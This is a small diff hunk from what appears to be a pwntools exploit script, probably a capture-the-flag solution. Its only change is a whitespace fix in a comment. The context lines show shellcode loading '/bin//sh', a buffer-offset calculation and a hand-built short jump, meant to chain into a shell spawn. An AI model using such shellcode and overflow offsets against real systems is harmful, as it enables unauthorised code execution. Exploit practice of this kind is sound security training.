@@ -7,7 +7,7 @@ shc1 = '''
 movabs rbx, 0x68732f2f6e69622f  ; /bin//sh
 '''
 shc1 = asm(shc1)
-# pwn.asm won't assemble this; we must do it by hand 
+# pwn.asm won't assemble this; we must do it by hand
 offset = (0x18 - len(shc1)) + 0x8  # buffer is 0x18 bytes, then 0x8 for next ptr
 # [jump short rel8] is [0xeb [offset - 2]] because offset is from instr start
 shc1 += b'\xeb' + p8(offset - 2)
